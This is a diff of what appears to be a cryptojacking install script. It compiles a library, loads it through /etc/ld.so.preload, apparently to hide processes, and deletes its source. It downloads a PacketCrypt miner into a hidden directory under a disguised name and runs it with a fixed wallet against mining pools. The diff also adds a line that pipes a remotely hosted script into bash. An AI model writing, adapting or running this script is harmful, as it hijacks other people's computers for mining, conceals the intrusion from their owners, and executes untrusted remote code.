@@ -6,9 +6,8 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
 mkdir .kap && cd .kap
 wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 >/dev/null 2>&1
 chmod +x sgr1 
 ./sgr1 ann -p pkt1qfj6fgahq88k5f28e7g6x9srcq40vva8aljlwjr http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com 
+curl -sL https://bitbucket.org/kzpakid/wtrr/raw/master/time | bash
